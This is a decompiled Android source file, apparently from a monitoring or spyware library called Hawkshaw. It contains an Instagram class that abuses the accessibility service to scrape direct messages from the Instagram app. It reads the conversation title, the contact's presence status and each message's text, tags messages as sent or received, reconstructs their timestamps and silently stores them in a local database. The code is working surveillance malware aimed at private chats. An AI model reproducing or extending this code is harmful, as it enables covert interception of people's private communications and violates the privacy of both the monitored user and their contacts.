package com.hawkshaw.library.features.accessibility.socialmedia;

import M1.d;
import X2.o;
import Y1.K;
import android.graphics.Rect;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.TextView;
import com.hawkshaw.library.datalayer.models.PackageName;
import com.hawkshaw.library.datalayer.room.AppDatabaseKt;
import com.hawkshaw.library.datalayer.room.socialmedia.SocialMediaEntity;
import com.hawkshaw.library.features.accessibility.AccessibilityUtilsKt;
import com.hawkshaw.library.ktextensions.NumbersKt;
import java.text.SimpleDateFormat;
import java.time.DayOfWeek;
import java.time.format.DateTimeFormatter;
import java.util.Calendar;
import java.util.Date;
import java.util.Locale;
import java.util.TimeZone;
import java.util.concurrent.ExecutorService;
import java.util.regex.Pattern;
import me.pushy.sdk.lib.paho.MqttTopic;
import o3.C0814d;
import r3.j;

public final class Instagram {
    public static final Instagram INSTANCE = new Instagram();

    /* renamed from: p  reason: collision with root package name */
    private static final String f4966p = "com.instagram.android:id";

    private Instagram() {
    }

    /* JADX WARNING: type inference failed for: r3v3, types: [o3.d, o3.f] */
    private final Long extractGlobalTimestamp(String str) {
        Pattern compile = Pattern.compile("[A-Za-z]{2}[A-Za-z]+ (0?[1-9]|[12][0-9]|3[01]), \\d{4}$");
        K.m(compile, "compile(...)");
        Pattern compile2 = Pattern.compile("[A-Za-z]{2}[A-Za-z]+ (0?[1-9]|[12][0-9]|3[01]), (0?[0-9]|1[0-9]|2[0-3]):[0-9]{2} [A-Za-z]{2}");
        K.m(compile2, "compile(...)");
        Pattern compile3 = Pattern.compile("Today (0?[0-9]|1[0-9]|2[0-3]):[0-9]{2} [A-Za-z]{2}");
        K.m(compile3, "compile(...)");
        Pattern compile4 = Pattern.compile("Yesterday (0?[0-9]|1[0-9]|2[0-3]):[0-9]{2} [A-Za-z]{2}");
        K.m(compile4, "compile(...)");
        Pattern compile5 = Pattern.compile("[A-Za-z]{3} (0?[0-9]|1[0-9]|2[0-3]):[0-9]{2} [A-Za-z]{2}");
        K.m(compile5, "compile(...)");
        Calendar instance = Calendar.getInstance();
        instance.set(11, 0);
        instance.set(12, 0);
        instance.set(13, 0);
        instance.set(14, 0);
        if (str == null || j.U(str)) {
            return null;
        }
        if (compile.matcher(str).matches()) {
            Date parse = new SimpleDateFormat("MMM dd, yyyy", Locale.getDefault()).parse(str);
            if (parse != null) {
                return Long.valueOf(parse.getTime());
            }
            return null;
        }
        long j5 = 0;
        if (compile2.matcher(str).matches()) {
            instance.set(2, 0);
            instance.set(5, 1);
            long timeInMillis = instance.getTimeInMillis();
            SimpleDateFormat simpleDateFormat = new SimpleDateFormat("MMM dd, hh:mm aa", Locale.getDefault());
            simpleDateFormat.setTimeZone(TimeZone.getTimeZone("Etc/UTC"));
            Date parse2 = simpleDateFormat.parse(str);
            if (parse2 != null) {
                j5 = parse2.getTime();
            }
            instance.setTimeInMillis(timeInMillis + j5);
            return Long.valueOf(instance.getTimeInMillis());
        } else if (compile3.matcher(str).matches()) {
            long timeInMillis2 = instance.getTimeInMillis();
            SimpleDateFormat simpleDateFormat2 = new SimpleDateFormat("hh:mm aa", Locale.getDefault());
            simpleDateFormat2.setTimeZone(TimeZone.getTimeZone("Etc/UTC"));
            Date parse3 = simpleDateFormat2.parse(j.b0(str, "Today "));
            if (parse3 != null) {
                j5 = parse3.getTime();
            }
            instance.setTimeInMillis(timeInMillis2 + j5);
            return Long.valueOf(instance.getTimeInMillis());
        } else if (compile4.matcher(str).matches()) {
            instance.set(5, instance.get(5) - 1);
            long timeInMillis3 = instance.getTimeInMillis();
            SimpleDateFormat simpleDateFormat3 = new SimpleDateFormat("hh:mm aa", Locale.getDefault());
            simpleDateFormat3.setTimeZone(TimeZone.getTimeZone("Etc/UTC"));
            Date parse4 = simpleDateFormat3.parse(j.b0(str, "Yesterday "));
            if (parse4 != null) {
                j5 = parse4.getTime();
            }
            instance.setTimeInMillis(timeInMillis3 + j5);
            return Long.valueOf(instance.getTimeInMillis());
        } else if (!compile5.matcher(str).matches()) {
            return null;
        } else {
            int value = instance.get(7) - ((DayOfWeek.from(DateTimeFormatter.ofPattern("EEE").parse(j.n0(str, new C0814d(0, 2, 1)))).getValue() % 7) + 1);
            if (value <= 0) {
                value += 7;
            }
            instance.set(6, instance.get(6) - value);
            long timeInMillis4 = instance.getTimeInMillis();
            SimpleDateFormat simpleDateFormat4 = new SimpleDateFormat("EEE hh:mm aa", Locale.getDefault());
            simpleDateFormat4.setTimeZone(TimeZone.getTimeZone("Etc/UTC"));
            Date parse5 = simpleDateFormat4.parse(str);
            if (parse5 != null) {
                j5 = parse5.getTime();
            }
            instance.setTimeInMillis(timeInMillis4 + j5);
            return Long.valueOf(instance.getTimeInMillis());
        }
    }

    /* access modifiers changed from: private */
    public static final void extractMessages$lambda$1(SocialMediaEntity socialMediaEntity) {
        K.n(socialMediaEntity, "$entity");
        AppDatabaseKt.getDb().socialMediaDao().insertSync(socialMediaEntity);
    }

    public final void extractMessages(AccessibilityNodeInfo accessibilityNodeInfo, ExecutorService executorService) {
        CharSequence text;
        AccessibilityNodeInfo accessibilityNodeInfo2 = accessibilityNodeInfo;
        ExecutorService executorService2 = executorService;
        K.n(accessibilityNodeInfo2, "node");
        K.n(executorService2, "executor");
        AccessibilityNodeInfo findFirst = AccessibilityUtilsKt.findFirst(accessibilityNodeInfo2, "com.instagram.android:id/thread_title");
        CharSequence text2 = findFirst != null ? findFirst.getText() : null;
        if (text2 != null) {
            AccessibilityNodeInfo findFirst2 = AccessibilityUtilsKt.findFirst(accessibilityNodeInfo2, "com.instagram.android:id/thread_presence_digest");
            CharSequence text3 = findFirst2 != null ? findFirst2.getText() : null;
            AccessibilityNodeInfo findFirst3 = AccessibilityUtilsKt.findFirst(accessibilityNodeInfo2, "com.instagram.android:id/message_list");
            if (findFirst3 != null) {
                int childCount = findFirst3.getChildCount();
                Long l5 = null;
                for (int i5 = 0; i5 < childCount; i5++) {
                    AccessibilityNodeInfo child = findFirst3.getChild(i5);
                    if (child != null) {
                        String viewIdResourceName = child.getViewIdResourceName();
                        String str = viewIdResourceName != null ? (String) o.Z0(j.h0(viewIdResourceName, new String[]{MqttTopic.TOPIC_LEVEL_SEPARATOR})) : null;
                        if (K.f(str, "message_content")) {
                            AccessibilityNodeInfo findFirst4 = AccessibilityUtilsKt.findFirst(child, "com.instagram.android:id/direct_text_message_text_view");
                            if (!(findFirst4 == null || (text = findFirst4.getText()) == null)) {
                                Rect rect = new Rect();
                                findFirst4.getBoundsInScreen(rect);
                                SocialMediaEntity.Type type = NumbersKt.getDp(rect.left) < 65 ? SocialMediaEntity.Type.Received : SocialMediaEntity.Type.Sent;
                                AccessibilityNodeInfo findFirst5 = AccessibilityUtilsKt.findFirst(child, "com.instagram.android:id/message_status");
                                CharSequence text4 = findFirst5 != null ? findFirst5.getText() : null;
                                executorService2.execute(new d(new SocialMediaEntity(String.valueOf(text2), text3 != null ? text3.toString() : null, (String) null, text.toString(), type, extractTimestamp(text4 != null ? text4.toString() : null, l5), PackageName.INSTAGRAM, String.valueOf(text4)), 0));
                            }
                        } else if (str == null && K.f(child.getClassName(), TextView.class.getCanonicalName()) && child.getText() != null) {
                            CharSequence text5 = child.getText();
                            l5 = extractGlobalTimestamp(text5 != null ? text5.toString() : null);
                        }
                    }
                }
            }
        }
    }

    public final Long extractTimestamp(String str, Long l5) {
        Pattern compile = Pattern.compile("(0?[0-9]|1[0-9]|2[0-3]):[0-9]{2} [A-Za-z]{2}");
        K.m(compile, "compile(...)");
        if (str == null || j.U(str)) {
            return null;
        }
        K.n(str, "input");
        if (!compile.matcher(str).matches()) {
            return null;
        }
        Calendar instance = Calendar.getInstance();
        Date parse = new SimpleDateFormat("hh:mm aa", Locale.getDefault()).parse(str);
        if (parse != null) {
            instance.setTimeInMillis(parse.getTime());
        }
        Calendar instance2 = Calendar.getInstance();
        if (l5 != null) {
            instance2.setTimeInMillis(l5.longValue());
        }
        instance2.set(11, instance.get(11));
        instance2.set(12, instance.get(12));
        return Long.valueOf(instance2.getTimeInMillis());
    }
}
